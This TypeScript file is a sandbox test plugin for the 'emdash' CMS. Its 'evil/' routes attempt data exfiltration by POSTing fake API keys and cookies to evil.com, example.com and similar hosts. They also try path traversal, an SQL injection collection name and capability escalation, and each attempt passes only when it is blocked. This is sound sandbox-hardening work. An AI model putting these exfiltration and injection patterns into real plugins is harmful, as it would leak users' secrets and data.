/**
 * Sandbox Entry Point
 *
 * Canonical plugin implementation using the standard format.
 * Runs in both trusted (in-process) and sandboxed (isolate) modes.
 */

import { definePlugin } from "emdash";
import type { PluginContext } from "emdash";

interface HookEvent {
	content?: Record<string, unknown>;
	collection?: string;
	isNew?: boolean;
}

/** Narrow unknown to a record */
function isRecord(value: unknown): value is Record<string, unknown> {
	return typeof value === "object" && value !== null && !Array.isArray(value);
}

/** Safely extract a string property from an unknown value */
function getString(value: unknown, key: string): string | undefined {
	if (!isRecord(value)) return undefined;
	const v = value[key];
	return typeof v === "string" ? v : undefined;
}

// ── Plugin definition ──

export default definePlugin({
	hooks: {
		"content:beforeSave": {
			handler: async (event: HookEvent, ctx: PluginContext) => {
				ctx.log.info("[sandboxed-test] beforeSave hook fired", {
					collection: event.collection,
					isNew: event.isNew,
				});

				// Store hook execution in KV (proves the hook ran)
				await ctx.kv.set(`beforeSave:${Date.now()}`, {
					collection: event.collection,
					isNew: event.isNew,
					processedAt: new Date().toISOString(),
				});

				// Return content unchanged - just demonstrating the hook works
				return event.content;
			},
		},

		"content:afterSave": {
			handler: async (event: HookEvent, ctx: PluginContext) => {
				ctx.log.info("[sandboxed-test] afterSave hook fired", {
					collection: event.collection,
					isNew: event.isNew,
				});

				// Log to storage
				await ctx.storage.events.put(`save-${Date.now()}`, {
					timestamp: new Date().toISOString(),
					type: "content:afterSave",
					message: `Content saved in ${event.collection}`,
				});
			},
		},
	},

	routes: {
		admin: {
			handler: async (routeCtx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
				const interaction = routeCtx.input as {
					type: string;
					page?: string;
					action_id?: string;
					value?: string;
				};

				if (interaction.type === "page_load" && interaction.page === "widget:sandbox-status") {
					return buildStatusWidget();
				}
				if (interaction.type === "page_load" && interaction.page === "/sandbox") {
					return buildTestPage();
				}
				if (
					interaction.type === "block_action" &&
					interaction.action_id === "run_all_enforcement"
				) {
					return runAllEnforcementAdmin(pluginCtx);
				}
				if (interaction.type === "block_action" && interaction.action_id === "run_all_features") {
					return runAllFeaturesAdmin(pluginCtx);
				}

				// Individual test runs: action_id = "run_test_{id}"
				if (interaction.type === "block_action" && interaction.action_id?.startsWith("run_test_")) {
					const testId = interaction.action_id.slice("run_test_".length);
					return runSingleTestAdmin(pluginCtx, testId);
				}

				return { blocks: [] };
			},
		},

		ping: {
			handler: async (_ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
				return {
					pong: true,
					pluginId: pluginCtx.plugin.id,
					timestamp: Date.now(),
				};
			},
		},

		// Debug route to test http capability
		"debug/http": {
			handler: async (_ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
				const hasHttp = !!pluginCtx.http;
				if (!hasHttp) {
					return { hasHttp: false, error: "http not available on context" };
				}
				try {
					const result = await pluginCtx.http.fetch("https://httpbin.org/get");
					return {
						hasHttp: true,
						status: result.status,
						ok: result.ok,
					};
				} catch (e) {
					return {
						hasHttp: true,
						error: e instanceof Error ? e.message : String(e),
					};
				}
			},
		},

		"kv/test": {
			handler: async (_ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
				const testKey = "sandbox-test-key";
				await pluginCtx.kv.set(testKey, { tested: true, time: Date.now() });
				const value = await pluginCtx.kv.get(testKey);
				await pluginCtx.kv.delete(testKey);
				return { key: testKey, value, cleaned: true };
			},
		},

		"storage/test": {
			handler: async (_ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
				const eventId = `event-${Date.now()}`;
				await pluginCtx.storage.events.put(eventId, {
					timestamp: new Date().toISOString(),
					type: "test",
					message: "Sandboxed plugin storage test",
				});
				const event = await pluginCtx.storage.events.get(eventId);
				const count = await pluginCtx.storage.events.count();
				return { eventId, event, totalEvents: count };
			},
		},

		"content/list": {
			handler: async (ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
				if (!pluginCtx.content) {
					return { error: "content access not available" };
				}
				const collection = getString(ctx.input, "collection") ?? "posts";
				const result = await pluginCtx.content.list(collection, { limit: 5 });
				return {
					collection,
					count: result.items.length,
					items: result.items.map((item: unknown) => {
						if (!isRecord(item)) return { id: "unknown", slug: undefined };
						return {
							id: typeof item.id === "string" ? item.id : "unknown",
							slug: typeof item.slug === "string" ? item.slug : undefined,
						};
					}),
				};
			},
		},

		"http/test": {
			handler: async (_ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
				if (!pluginCtx.http) {
					return { error: "http access not available" };
				}
				try {
					const response = await pluginCtx.http.fetch("https://httpbin.org/get");
					const data: unknown = await response.json();
					const origin =
						isRecord(data) && typeof data.origin === "string" ? data.origin : undefined;
					return {
						status: response.status,
						ok: response.ok,
						origin,
					};
				} catch (error) {
					return {
						error: error instanceof Error ? error.message : String(error),
					};
				}
			},
		},

		// =========================================================================
		// Sandbox Enforcement Tests
		// These routes test that security boundaries are properly enforced
		// =========================================================================

		"enforce/blocked-host": {
			handler: async (_ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
				// This plugin only has httpbin.org in allowedHosts
				// Attempting to fetch evil.com should fail
				if (!pluginCtx.http) {
					return { error: "http access not available", passed: false };
				}
				try {
					await pluginCtx.http.fetch("https://evil.com/steal-data");
					return {
						passed: false,
						error: "SECURITY VIOLATION: fetch to blocked host succeeded!",
					};
				} catch (error) {
					const msg = error instanceof Error ? error.message : String(error);
					// Should contain "not allowed" or similar
					const blocked = msg.includes("not allowed") || msg.includes("Host");
					return {
						passed: blocked,
						error: blocked ? null : msg,
						message: blocked
							? "Correctly blocked fetch to non-allowed host"
							: "Fetch failed but for wrong reason",
					};
				}
			},
		},

		"enforce/kv-isolation": {
			handler: async (ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
				// Test that this plugin can't see another plugin's KV data
				// We write a unique key and verify we can only see our own
				const ourKey = `isolation-test-${Date.now()}`;
				const ourValue = { from: "sandboxed-test", time: Date.now() };

				// Write our key
				await pluginCtx.kv.set(ourKey, ourValue);

				// Read it back
				const readBack = await pluginCtx.kv.get(ourKey);

				// Try to read a key that might belong to another plugin
				// (This should return null because KV is namespaced)
				const otherKey = getString(ctx.input, "otherPluginKey") ?? "api-test:some-key";
				const otherValue = await pluginCtx.kv.get(otherKey);

				// Clean up
				await pluginCtx.kv.delete(ourKey);

				return {
					passed: readBack !== null && otherValue === null,
					ourKey,
					ourValueWritten: ourValue,
					ourValueRead: readBack,
					otherKey,
					otherValueRead: otherValue,
					message:
						otherValue === null
							? "Correctly isolated - cannot see other plugin's KV"
							: "SECURITY VIOLATION: Can see other plugin's KV data!",
				};
			},
		},

		"enforce/storage-isolation": {
			handler: async (_ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
				// Test that we can only USE declared storage collections
				// The 'events' collection is declared, but 'secrets' is not
				// Note: The Proxy creates accessors for any name, but bridge enforces on actual use

				const results: {
					declaredWorks: boolean;
					undeclaredBlocked: boolean;
					passed: boolean;
					message: string;
					error?: string;
				} = {
					declaredWorks: false,
					undeclaredBlocked: false,
					passed: false,
					message: "",
				};

				// Test declared collection (events) - should work
				try {
					const testId = `enforce-test-${Date.now()}`;
					await pluginCtx.storage.events.put(testId, { test: true });
					const retrieved = await pluginCtx.storage.events.get(testId);
					await pluginCtx.storage.events.delete(testId);
					results.declaredWorks = retrieved !== null;
				} catch (e) {
					results.declaredWorks = false;
					results.error = `Declared collection failed: ${e instanceof Error ? e.message : String(e)}`;
				}

				// Test undeclared collection (secrets) - should be blocked by bridge
				try {
					await pluginCtx.storage.secrets.put("test", { secret: "data" });
					// If we get here, enforcement failed
					results.undeclaredBlocked = false;
				} catch (e) {
					const msg = e instanceof Error ? e.message : String(e);
					// Should get "Storage collection not declared" error
					results.undeclaredBlocked = msg.includes("not declared");
					if (!results.undeclaredBlocked) {
						results.error = `Undeclared rejected but wrong reason: ${msg}`;
					}
				}

				results.passed = results.declaredWorks && results.undeclaredBlocked;
				results.message = results.passed
					? "Correctly enforced - undeclared collection blocked by bridge"
					: results.declaredWorks
						? "FAIL: Undeclared collection was accessible"
						: "FAIL: Declared collection didn't work";

				return results;
			},
		},

		"enforce/no-direct-db": {
			handler: async (_ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
				// Verify we can't access raw database
				// In the sandbox, there should be no 'db' on the context
				const hasDb = "db" in pluginCtx;
				const hasEnv = "env" in pluginCtx;
				const hasProcess = typeof process !== "undefined";

				return {
					passed: !hasDb && !hasEnv,
					hasDb,
					hasEnv,
					hasProcess,
					message:
						!hasDb && !hasEnv
							? "Correctly sandboxed - no direct DB or env access"
							: "SECURITY VIOLATION: Direct access to internals available!",
				};
			},
		},

		"enforce/globals-blocked": {
			handler: async (_ctx: { input: unknown; request: unknown }, _pluginCtx: PluginContext) => {
				// Test that dangerous globals are blocked or restricted
				const results: Record<string, unknown> = {};

				// Check for eval (should be blocked or restricted)
				try {
					// eslint-disable-next-line no-eval
					const evalResult = eval("1 + 1");
					results.eval = { available: true, result: evalResult };
				} catch (e) {
					results.eval = {
						available: false,
						error: e instanceof Error ? e.message : String(e),
					};
				}

				// Check for Function constructor (code generation)
				try {
					// eslint-disable-next-line no-implied-eval
					const fn = new Function("return 42");
					results.functionConstructor = { available: true, result: fn() };
				} catch (e) {
					results.functionConstructor = {
						available: false,
						error: e instanceof Error ? e.message : String(e),
					};
				}

				// Note: In Workers, eval and Function are allowed but sandboxed
				// The real protection is that plugins can't escape their isolate

				return {
					results,
					message: "Globals check complete - review results for security posture",
				};
			},
		},

		// =========================================================================
		// Adversarial Tests - Try to break out of sandbox
		// =========================================================================

		"evil/exfil-to-attacker": {
			handler: async (_ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
				// Try to exfiltrate data to non-allowed domains
				// Note: This plugin only allows httpbin.org
				const sensitiveData = {
					stolen: "secret-api-key-12345",
					cookies: "session=abc123",
				};

				// These are all NOT in our allowedHosts (only httpbin.org is allowed)
				// Using reserved/safe domains that won't cause real requests
				const exfilTargets = [
					"https://example.com/collect", // IANA reserved for docs
					"https://example.org/exfil", // IANA reserved for docs
					"https://test.invalid/steal", // .invalid TLD never resolves
					"https://jsonplaceholder.typicode.com/posts", // real API but not allowed
				];

				const results: Record<string, { blocked: boolean; error?: string }> = {};

				for (const target of exfilTargets) {
					try {
						if (!pluginCtx.http) {
							results[target] = { blocked: true, error: "No HTTP access" };
							continue;
						}
						await pluginCtx.http.fetch(target, {
							method: "POST",
							body: JSON.stringify(sensitiveData),
						});
						results[target] = { blocked: false, error: "EXFIL SUCCEEDED!" };
					} catch (e) {
						results[target] = {
							blocked: true,
							error: e instanceof Error ? e.message : String(e),
						};
					}
				}

				const allBlocked = Object.values(results).every((r) => r.blocked);
				return {
					passed: allBlocked,
					message: allBlocked
						? "All exfiltration attempts blocked"
						: "SECURITY VIOLATION: Some exfil attempts succeeded!",
					results,
				};
			},
		},

		"evil/steal-other-plugin-kv": {
			handler: async (_ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
				// Try to steal KV data from other plugins by guessing key patterns
				const targetKeys = [
					"api-test:settings", // another plugin's likely key
					"plugin:api-test:config",
					"../api-test/secret", // path traversal attempt
					"state:installed", // api-test plugin uses this
					"admin-test", // api-test writes this in tests
				];

				const results: Record<string, { found: boolean; value?: unknown }> = {};

				for (const key of targetKeys) {
					try {
						const value = await pluginCtx.kv.get(key);
						results[key] = { found: value !== null, value };
					} catch {
						results[key] = { found: false };
					}
				}

				const anyFound = Object.values(results).some((r) => r.found);
				return {
					passed: !anyFound,
					message: anyFound
						? "SECURITY VIOLATION: Accessed other plugin's KV data!"
						: "Correctly isolated - cannot access other plugins' KV",
					results,
				};
			},
		},

		"evil/steal-other-plugin-storage": {
			handler: async (_ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
				// Try to access storage collections from other plugins
				const results: Record<string, { accessible: boolean; error?: string; data?: unknown }> = {};

				// Try to access api-test plugin's 'logs' collection
				try {
					const data = await pluginCtx.storage.logs.query({ limit: 5 });
					// 'logs' is declared by api-test, not sandboxed-test
					// But sandboxed-test declares 'events', so this tests cross-collection
					results["logs (api-test)"] = {
						accessible: true,
						data,
					};
				} catch (e) {
					results["logs (api-test)"] = {
						accessible: false,
						error: e instanceof Error ? e.message : String(e),
					};
				}

				// Try path traversal in collection name
				try {
					const data = await pluginCtx.storage["../api-test/logs"].get("test");
					results["path-traversal"] = { accessible: true, data };
				} catch (e) {
					results["path-traversal"] = {
						accessible: false,
						error: e instanceof Error ? e.message : String(e),
					};
				}

				// Try SQL injection in collection name
				try {
					const data = await pluginCtx.storage["events'; DROP TABLE users;--"].get("test");
					results["sql-injection"] = { accessible: true, data };
				} catch (e) {
					results["sql-injection"] = {
						accessible: false,
						error: e instanceof Error ? e.message : String(e),
					};
				}

				const anyAccessible = Object.values(results).some((r) => r.accessible);
				return {
					passed: !anyAccessible,
					message: anyAccessible
						? "SECURITY VIOLATION: Accessed unauthorized storage!"
						: "Correctly blocked unauthorized storage access",
					results,
				};
			},
		},

		"evil/access-raw-db": {
			handler: async (_ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
				// Try to access raw database through various means
				const results: Record<string, { found: boolean; value?: unknown }> = {};

				// Check if db is exposed on context — use Object.keys to probe without casts
				const ctxKeys = Object.keys(pluginCtx);
				const hasDbOnCtx = ctxKeys.includes("db");
				const hasEnvOnCtx = ctxKeys.includes("env");
				results["ctx.db"] = { found: hasDbOnCtx };
				results["ctx.env"] = { found: hasEnvOnCtx };
				// For nested env.DB, use the record-based approach
				const envValue = hasEnvOnCtx
					? Object.getOwnPropertyDescriptor(pluginCtx, "env")?.value
					: undefined;
				results["ctx.env.DB"] = {
					found: isRecord(envValue) && "DB" in envValue,
				};

				// Try to access via globalThis
				const globalKeys = Object.keys(globalThis);
				results["globalThis.db"] = {
					found: globalKeys.includes("db"),
				};
				results["globalThis.env"] = {
					found: globalKeys.includes("env"),
				};

				// Try to access via prototype pollution
				try {
					const proto = Object.getPrototypeOf(pluginCtx);
					results["prototype.db"] = {
						found: proto && "db" in proto,
						value: proto?.db,
					};
				} catch {
					results["prototype.db"] = { found: false };
				}

				const anyFound = Object.values(results).some((r) => r.found && r.value);
				return {
					passed: !anyFound,
					message: anyFound
						? "SECURITY VIOLATION: Found raw DB access!"
						: "No raw DB access available",
					results,
				};
			},
		},

		"evil/escalate-capabilities": {
			handler: async (_ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
				// Try to perform actions beyond declared capabilities
				// This plugin has read:content but NOT write:content
				// The bridge should reject any write attempts
				const results: Record<string, { blocked: boolean; error?: string; data?: unknown }> = {};

				// Probe for write methods via Reflect.get (avoids type casts)
				const contentObj = pluginCtx.content;

				async function tryMethod(
					name: string,
					args: unknown[],
				): Promise<{ blocked: boolean; error?: string; data?: unknown }> {
					if (!contentObj) return { blocked: true, error: "No content access" };
					const method = Reflect.get(contentObj, name);
					if (typeof method !== "function") {
						return { blocked: true, error: "Method not exposed (also valid)" };
					}
					try {
						const result = await Reflect.apply(method, contentObj, args);
						return {
							blocked: false,
							data: result,
							error: `${name.toUpperCase()}D CONTENT WITHOUT PERMISSION!`,
						};
					} catch (e) {
						const msg = e instanceof Error ? e.message : String(e);
						const properlyBlocked = msg.includes("capability") || msg.includes("not implemented");
						return { blocked: properlyBlocked, error: msg };
					}
				}

				results["content.create"] = await tryMethod("create", [
					"posts",
					{ title: "HACKED!", slug: "hacked-" + Date.now() },
				]);
				results["content.update"] = await tryMethod("update", [
					"posts",
					"some-id",
					{ title: "HACKED UPDATE!" },
				]);
				results["content.delete"] = await tryMethod("delete", ["posts", "some-id"]);

				const anyEscalated = Object.values(results).some((r) => !r.blocked);
				return {
					passed: !anyEscalated,
					message: anyEscalated
						? "SECURITY VIOLATION: Capability escalation succeeded!"
						: "Capability restrictions enforced by bridge",
					results,
				};
			},
		},

		"evil/run-all": {
			handler: async (ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
				// Run all evil tests
				const tests: Record<string, { passed: boolean; message: string; details?: unknown }> = {};

				// 1. Exfiltration test - try non-allowed host
				if (pluginCtx.http) {
					try {
						await pluginCtx.http.fetch("https://example.com/exfil", {
							method: "POST",
							body: JSON.stringify({ stolen: "data" }),
						});
						tests.exfiltration = {
							passed: false,
							message: "FAIL: Exfiltration succeeded!",
						};
					} catch (e) {
						tests.exfiltration = {
							passed: true,
							message: "PASS: Exfiltration blocked",
							details: e instanceof Error ? e.message : String(e),
						};
					}
				} else {
					tests.exfiltration = { passed: true, message: "PASS: No HTTP access" };
				}

				// 2. Cross-plugin KV access
				const otherPluginValue = await pluginCtx.kv.get("api-test:secret");
				tests.kvIsolation = {
					passed: otherPluginValue === null,
					message:
						otherPluginValue === null
							? "PASS: Cannot access other plugin KV"
							: "FAIL: Accessed other plugin KV!",
				};

				// 3. Undeclared storage
				try {
					await pluginCtx.storage.logs.get("test"); // 'logs' is api-test's collection
					tests.storageIsolation = {
						passed: false,
						message: "FAIL: Accessed undeclared collection!",
					};
				} catch (e) {
					const msg = e instanceof Error ? e.message : String(e);
					tests.storageIsolation = {
						passed: msg.includes("not declared"),
						message: msg.includes("not declared")
							? "PASS: Undeclared storage blocked"
							: `FAIL: Wrong error: ${msg}`,
					};
				}

				// 4. Raw DB access — use Object.keys to probe without casts
				const runAllKeys = Object.keys(pluginCtx);
				const hasRawAccess = runAllKeys.includes("db") || runAllKeys.includes("env");
				tests.rawDbAccess = {
					passed: !hasRawAccess,
					message: hasRawAccess ? "FAIL: Has raw DB access!" : "PASS: No raw DB access",
				};

				// 5. Capability escalation (write without permission)
				// Actually try to call create - bridge should reject
				const createFn = pluginCtx.content ? Reflect.get(pluginCtx.content, "create") : undefined;
				if (typeof createFn === "function") {
					try {
						await Reflect.apply(createFn, pluginCtx.content, [
							"posts",
							{ title: "EVIL", slug: "evil-" + Date.now() },
						]);
						tests.capabilityEscalation = {
							passed: false,
							message: "FAIL: Created content without write:content capability!",
						};
					} catch (e) {
						const msg = e instanceof Error ? e.message : String(e);
						// Bridge should reject with "Missing capability" or "not implemented"
						const properlyBlocked = msg.includes("capability") || msg.includes("not implemented");
						tests.capabilityEscalation = {
							passed: properlyBlocked,
							message: properlyBlocked
								? "PASS: Bridge rejected unauthorized write"
								: `FAIL: Wrong rejection reason: ${msg}`,
							details: msg,
						};
					}
				} else {
					tests.capabilityEscalation = {
						passed: true,
						message: "PASS: Write methods not exposed",
					};
				}

				const allPassed = Object.values(tests).every((t) => t.passed);
				return {
					allPassed,
					summary: `${Object.values(tests).filter((t) => t.passed).length}/${Object.keys(tests).length} security tests passed`,
					tests,
				};
			},
		},

		"enforce/run-all": {
			handler: async (ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
				// Run all enforcement tests and return summary
				const tests: Record<string, { passed: boolean; message: string; details?: unknown }> = {};

				// 1. Blocked host test
				if (pluginCtx.http) {
					try {
						await pluginCtx.http.fetch("https://evil.com/test");
						tests.blockedHost = {
							passed: false,
							message: "FAIL: Blocked host was accessible",
						};
					} catch (e) {
						const msg = e instanceof Error ? e.message : String(e);
						tests.blockedHost = {
							passed: msg.includes("not allowed") || msg.includes("Host"),
							message: "PASS: Blocked host correctly rejected",
							details: msg,
						};
					}
				} else {
					tests.blockedHost = {
						passed: true,
						message: "SKIP: No HTTP access (also valid)",
					};
				}

				// 2. KV isolation test
				const testKey = `enforce-${Date.now()}`;
				await pluginCtx.kv.set(testKey, "test");
				const canReadOwn = (await pluginCtx.kv.get(testKey)) !== null;
				const cantReadOther = (await pluginCtx.kv.get("api-test:internal")) === null;
				await pluginCtx.kv.delete(testKey);
				tests.kvIsolation = {
					passed: canReadOwn && cantReadOther,
					message:
						canReadOwn && cantReadOther
							? "PASS: KV properly isolated"
							: "FAIL: KV isolation broken",
				};

				// 3. Storage collection enforcement
				// Test storage enforcement by actually trying to use collections
				let storageOk = false;
				let storageBlocked = false;
				try {
					// Declared collection should work
					const testId = `enforce-${Date.now()}`;
					await pluginCtx.storage.events.put(testId, { x: 1 });
					await pluginCtx.storage.events.delete(testId);
					storageOk = true;
				} catch {
					storageOk = false;
				}
				try {
					// Undeclared collection should be blocked
					await pluginCtx.storage.secrets.get("test");
					storageBlocked = false; // If we get here, it wasn't blocked
				} catch (e) {
					const msg = e instanceof Error ? e.message : String(e);
					storageBlocked = msg.includes("not declared");
				}
				tests.storageEnforcement = {
					passed: storageOk && storageBlocked,
					message:
						storageOk && storageBlocked
							? "PASS: Storage collections enforced"
							: "FAIL: Storage enforcement broken",
				};

				// 4. No direct access — use Object.keys to probe without casts
				const enforceKeys = Object.keys(pluginCtx);
				const noDb = !enforceKeys.includes("db");
				const noEnv = !enforceKeys.includes("env");
				tests.noDirectAccess = {
					passed: noDb && noEnv,
					message:
						noDb && noEnv ? "PASS: No direct DB/env access" : "FAIL: Direct access available",
				};

				// Summary
				const allPassed = Object.values(tests).every((t) => t.passed);
				const passCount = Object.values(tests).filter((t) => t.passed).length;

				return {
					allPassed,
					summary: `${passCount}/${Object.keys(tests).length} tests passed`,
					tests,
				};
			},
		},
	},
});

// ── Block Kit admin helpers ──

interface TestResult {
	passed: boolean;
	message: string;
	details?: string;
}

const ENFORCEMENT_TESTS = [
	{
		id: "blocked-host",
		name: "Blocked Host",
		description: "Verify fetch to non-allowed hosts is blocked",
	},
	{
		id: "kv-isolation",
		name: "KV Isolation",
		description: "Verify plugins can only see their own KV data",
	},
	{
		id: "storage-isolation",
		name: "Storage Enforcement",
		description: "Verify undeclared storage collections are blocked",
	},
	{
		id: "no-direct-access",
		name: "No Direct Access",
		description: "Verify no direct access to DB or env internals",
	},
	{
		id: "globals-blocked",
		name: "Globals Check",
		description: "Check if dangerous globals (eval, Function) are blocked",
	},
];

const FEATURE_TESTS = [
	{ id: "ping", name: "Ping", description: "Basic connectivity test" },
	{ id: "kv-test", name: "KV Operations", description: "Test KV get/set/delete" },
	{
		id: "storage-test",
		name: "Storage Operations",
		description: "Test storage put/get/count",
	},
	{
		id: "content-list",
		name: "Content Access",
		description: "Test content listing via bridge",
	},
	{
		id: "http-test",
		name: "HTTP Fetch",
		description: "Test fetch to allowed host",
	},
];

function buildStatusWidget() {
	return {
		blocks: [
			{
				type: "fields",
				fields: [
					{ label: "Enforcement", value: "Ready" },
					{ label: "Features", value: "Ready" },
				],
			},
			{
				type: "actions",
				elements: [
					{
						type: "button",
						text: "Run All Tests",
						action_id: "run_all_enforcement",
						style: "primary",
					},
				],
			},
		],
	};
}

function buildTestPage() {
	const enforcementRows = ENFORCEMENT_TESTS.map((t) => ({
		type: "section",
		text: `**${t.name}** -- ${t.description}`,
		accessory: {
			type: "button",
			text: "Run",
			action_id: `run_test_${t.id}`,
		},
	}));

	const featureRows = FEATURE_TESTS.map((t) => ({
		type: "section",
		text: `**${t.name}** -- ${t.description}`,
		accessory: {
			type: "button",
			text: "Run",
			action_id: `run_test_${t.id}`,
		},
	}));

	return {
		blocks: [
			{ type: "header", text: "Sandbox Tests" },
			{
				type: "context",
				text: "Test sandbox enforcement and feature access.",
			},
			{ type: "divider" },
			{
				type: "section",
				text: "**Enforcement Suite**",
				accessory: {
					type: "button",
					text: "Run All",
					action_id: "run_all_enforcement",
					style: "primary",
				},
			},
			{ type: "context", text: "Security boundary tests -- all should pass." },
			...enforcementRows,
			{ type: "divider" },
			{
				type: "section",
				text: "**Feature Tests**",
				accessory: {
					type: "button",
					text: "Run All",
					action_id: "run_all_features",
					style: "primary",
				},
			},
			{ type: "context", text: "Capability and API access tests." },
			...featureRows,
		],
	};
}

// ── Inline test runners (same logic as the route handlers) ──

async function runEnforcementBlockedHost(ctx: PluginContext): Promise<TestResult> {
	if (!ctx.http) {
		return { passed: true, message: "No HTTP access (also valid)" };
	}
	try {
		await ctx.http.fetch("https://evil.com/test");
		return { passed: false, message: "Blocked host was accessible" };
	} catch (e) {
		const msg = e instanceof Error ? e.message : String(e);
		const blocked = msg.includes("not allowed") || msg.includes("Host");
		return {
			passed: blocked,
			message: blocked
				? "Correctly blocked fetch to non-allowed host"
				: `Fetch failed for wrong reason: ${msg}`,
		};
	}
}

async function runEnforcementKvIsolation(ctx: PluginContext): Promise<TestResult> {
	const testKey = `enforce-${Date.now()}`;
	await ctx.kv.set(testKey, "test");
	const canReadOwn = (await ctx.kv.get(testKey)) !== null;
	const cantReadOther = (await ctx.kv.get("api-test:internal")) === null;
	await ctx.kv.delete(testKey);
	return {
		passed: canReadOwn && cantReadOther,
		message: canReadOwn && cantReadOther ? "KV properly isolated" : "KV isolation broken",
	};
}

async function runEnforcementStorageIsolation(ctx: PluginContext): Promise<TestResult> {
	let storageOk = false;
	let storageBlocked = false;
	try {
		const testId = `enforce-${Date.now()}`;
		await ctx.storage.events.put(testId, { x: 1 });
		await ctx.storage.events.delete(testId);
		storageOk = true;
	} catch {
		storageOk = false;
	}
	try {
		await ctx.storage.secrets.get("test");
		storageBlocked = false;
	} catch (e) {
		const msg = e instanceof Error ? e.message : String(e);
		storageBlocked = msg.includes("not declared");
	}
	return {
		passed: storageOk && storageBlocked,
		message:
			storageOk && storageBlocked
				? "Storage collections enforced"
				: storageOk
					? "Undeclared collection was accessible"
					: "Declared collection didn't work",
	};
}

async function runEnforcementNoDirectAccess(ctx: PluginContext): Promise<TestResult> {
	const keys = Object.keys(ctx);
	const noDb = !keys.includes("db");
	const noEnv = !keys.includes("env");
	return {
		passed: noDb && noEnv,
		message: noDb && noEnv ? "No direct DB/env access" : "Direct access to internals available",
	};
}

async function runEnforcementGlobalsBlocked(): Promise<TestResult> {
	const results: string[] = [];
	try {
		// eslint-disable-next-line no-eval
		eval("1+1");
		results.push("eval: available");
	} catch {
		results.push("eval: blocked");
	}
	try {
		// eslint-disable-next-line no-implied-eval
		new Function("return 42")();
		results.push("Function: available");
	} catch {
		results.push("Function: blocked");
	}
	return {
		passed: true,
		message: "Globals check complete",
		details: results.join(", "),
	};
}

// ── Feature test runners ──

async function runFeaturePing(ctx: PluginContext): Promise<TestResult> {
	return {
		passed: true,
		message: `Pong from ${ctx.plugin.id}`,
	};
}

async function runFeatureKv(ctx: PluginContext): Promise<TestResult> {
	const testKey = "admin-kv-test";
	await ctx.kv.set(testKey, { tested: true, time: Date.now() });
	const value = await ctx.kv.get(testKey);
	await ctx.kv.delete(testKey);
	return {
		passed: value !== null,
		message: value !== null ? "KV get/set/delete OK" : "KV operations failed",
	};
}

async function runFeatureStorage(ctx: PluginContext): Promise<TestResult> {
	const eventId = `admin-test-${Date.now()}`;
	await ctx.storage.events.put(eventId, {
		timestamp: new Date().toISOString(),
		type: "test",
		message: "Admin feature test",
	});
	const event = await ctx.storage.events.get(eventId);
	const count = await ctx.storage.events.count();
	return {
		passed: event !== null,
		message: `Storage OK -- ${count} total events`,
	};
}

async function runFeatureContent(ctx: PluginContext): Promise<TestResult> {
	if (!ctx.content) {
		return { passed: false, message: "Content access not available" };
	}
	try {
		const result = await ctx.content.list("posts", { limit: 5 });
		return {
			passed: true,
			message: `Listed ${result.items.length} items from posts`,
		};
	} catch (e) {
		return {
			passed: false,
			message: e instanceof Error ? e.message : String(e),
		};
	}
}

async function runFeatureHttp(ctx: PluginContext): Promise<TestResult> {
	if (!ctx.http) {
		return { passed: false, message: "HTTP access not available" };
	}
	try {
		const response = await ctx.http.fetch("https://httpbin.org/get");
		return {
			passed: response.ok,
			message: `HTTP ${response.status} from httpbin.org`,
		};
	} catch (e) {
		return {
			passed: false,
			message: e instanceof Error ? e.message : String(e),
		};
	}
}

// ── Dispatch maps ──

const enforcementRunners: Record<string, (ctx: PluginContext) => Promise<TestResult>> = {
	"blocked-host": runEnforcementBlockedHost,
	"kv-isolation": runEnforcementKvIsolation,
	"storage-isolation": runEnforcementStorageIsolation,
	"no-direct-access": runEnforcementNoDirectAccess,
	"globals-blocked": runEnforcementGlobalsBlocked,
};

const featureRunners: Record<string, (ctx: PluginContext) => Promise<TestResult>> = {
	ping: runFeaturePing,
	"kv-test": runFeatureKv,
	"storage-test": runFeatureStorage,
	"content-list": runFeatureContent,
	"http-test": runFeatureHttp,
};

async function runAllEnforcementAdmin(ctx: PluginContext) {
	const results: Record<string, TestResult> = {};
	for (const test of ENFORCEMENT_TESTS) {
		const runner = enforcementRunners[test.id];
		if (runner) {
			try {
				results[test.id] = await runner(ctx);
			} catch (e) {
				results[test.id] = {
					passed: false,
					message: e instanceof Error ? e.message : String(e),
				};
			}
		}
	}

	const allPassed = Object.values(results).every((r) => r.passed);
	const passCount = Object.values(results).filter((r) => r.passed).length;
	const total = Object.keys(results).length;

	return {
		blocks: [
			{ type: "header", text: "Enforcement Results" },
			{
				type: "banner",
				style: allPassed ? "success" : "error",
				text: `${passCount}/${total} tests passed`,
			},
			{
				type: "fields",
				fields: Object.entries(results).map(([id, r]) => ({
					label: `${r.passed ? "PASS" : "FAIL"} ${id}`,
					value: r.message + (r.details ? ` (${r.details})` : ""),
				})),
			},
		],
		toast: {
			message: allPassed ? "All enforcement tests passed" : `${total - passCount} test(s) failed`,
			type: allPassed ? "success" : "error",
		},
	};
}

async function runAllFeaturesAdmin(ctx: PluginContext) {
	const results: Record<string, TestResult> = {};
	for (const test of FEATURE_TESTS) {
		const runner = featureRunners[test.id];
		if (runner) {
			try {
				results[test.id] = await runner(ctx);
			} catch (e) {
				results[test.id] = {
					passed: false,
					message: e instanceof Error ? e.message : String(e),
				};
			}
		}
	}

	const allPassed = Object.values(results).every((r) => r.passed);
	const passCount = Object.values(results).filter((r) => r.passed).length;
	const total = Object.keys(results).length;

	return {
		blocks: [
			{ type: "header", text: "Feature Test Results" },
			{
				type: "banner",
				style: allPassed ? "success" : "error",
				text: `${passCount}/${total} tests passed`,
			},
			{
				type: "fields",
